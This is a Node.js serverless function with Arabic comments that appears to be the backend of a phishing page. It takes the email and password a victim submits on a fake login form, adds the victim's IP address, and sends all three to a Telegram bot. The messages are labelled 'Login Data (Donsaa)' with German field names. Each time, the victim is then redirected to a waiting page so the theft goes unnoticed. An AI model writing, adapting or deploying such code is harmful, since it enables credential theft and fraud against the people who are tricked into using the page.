// نستخدم مكتبة node-fetch لإرسال طلبات HTTP (لاستدعاء Telegram API)
// تأكد من تشغيل npm install node-fetch في جذر مشروعك إذا كنت تختبر محليًا
// Netlify Functions تدعمها تلقائيًا في بيئتها

const fetch = require('node-fetch');

// دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    // لا نحتاج لترميمز \n لأنها لا تفسد تنسيق MarkdownV2 هنا
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};


exports.handler = async (event, context) => {
    // التحقق من نوع الطلب (يجب أن يكون POST من النموذج)
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            body: "Method Not Allowed",
        };
    }
    
    // فك ترميز بيانات النموذج التي تأتي كـ URL-encoded
    const bodyParams = new URLSearchParams(event.body);
    
    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';
    const ip = event.headers['client-ip'] || 'غير متوفر'; // Netlify يزود IP هنا

    // تطبيق الترميز
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);
    
    // تشكيل الرسالة
    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\n`;
    message_text += `Passwort: \`${safe_password}\`\n`;
    message_text += `IP: \`${safe_ip}\``; 

    // إعدادات Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram credentials missing in environment variables.");
        // بالرغم من الخطأ، سنقوم بالتحويل لتجنب توقف المستخدم
        return {
            statusCode: 303,
            headers: {
                Location: '/waiting.html',
            },
        };
    }

    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message_text,
        parse_mode: 'MarkdownV2',
    };

    // إرسال البيانات إلى Telegram
    try {
        await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
    
    // التحويل إلى صفحة الانتظار
    return {
        statusCode: 303,
        headers: {
            Location: '/waiting.html',
        },
    };
};
